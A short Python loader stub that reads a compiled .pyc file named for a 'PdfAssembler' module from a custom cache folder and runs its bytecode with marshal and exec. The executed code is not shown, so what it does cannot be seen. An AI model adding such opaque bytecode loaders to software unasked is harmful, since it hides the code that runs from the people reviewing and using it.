
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfAssembler_39f434a061d14992943a559cd39f44cf.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
